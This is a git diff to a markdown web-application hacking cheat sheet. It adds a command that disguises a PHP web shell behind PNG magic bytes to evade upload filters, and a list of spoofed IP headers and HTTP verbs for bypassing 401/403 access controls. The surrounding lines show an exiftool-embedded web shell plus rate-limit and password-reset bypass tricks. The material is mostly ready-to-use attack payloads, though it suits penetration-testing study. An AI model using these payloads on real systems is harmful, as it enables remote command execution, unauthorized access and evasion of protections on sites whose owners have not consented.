@@ -253,7 +253,16 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' evil.jpg
 
 mv evil.jpg evil.php.jpg
 ```
+
+`magic header`
+```
+head -c 20 example.png > magic.php && echo "<?php system($_GET['cmd']);?>" >> magic.php
+```
+
+
 ### Bypass 401/403
+
+#### Try differnet verbs to access the file-> `GET`, `HEAD`, `POST`, `PUT`, `DELETE`, `CONNECT`, `OPTIONS`, `TRACE`, `PATCH`, `INVENTED`, `HACK`
 ```http
 GET /api/getUser --> 403
 GET / + X-Original-URL : /api/GetUser --> 200
@@ -263,9 +272,23 @@ GET / + Referer : https://site.com/api/GetUser --> 200
 or
 GET /api/getUser + Referer : https://site.com/api/GetUser --> 200
 ```
-<img src="/assets/img/401-403-bypass.jpeg?raw=true"/>
-<img src="/assets/img/401-403-bypass1.jpeg?raw=true"/>
-<img src="/assets/img/401-403-bypass-payload.jpeg?raw=true"/>
+<img src="/assets/img/401-403-bypass.jpeg?raw=true" width="600" height="600"/>
+<img src="/assets/img/401-403-bypass1.jpeg?raw=true" width="600" height="600"/>
+<img src="/assets/img/401-403-bypass-payload.jpeg?raw=true" width="600" height="600"/>
+
+```
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded: 127.0.0.1
+Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Original-URL: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+```
 
 ### Bypass 429
 #### Rate Limiting Bypass : `429 Too many Requests`
@@ -276,7 +299,7 @@ GET /api/getUser + Referer : https://site.com/api/GetUser --> 200
 Client-Ip: [random-ip] -> 200
 X-Client-Ip: [random-ip] -> 200
 X-Forwarded-For: [random-ip] -> 200
-X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: 127.0.0.1 -> 200
 ```
 
 ### Bypass password reset
@@ -285,7 +308,7 @@ X-Forwarded-For: 127.0.0.1
 3. Try to use a reset token on another account
 4. Try to figure out how token are generated
 
-<img src="/assets/img/password-reset.jpeg?raw=true"/>
+<img src="/assets/img/password-reset.jpeg?raw=true"/ width="500" height="600">
 
 -------------------------------------------------------------------------------------------------------------
 # PHP filters
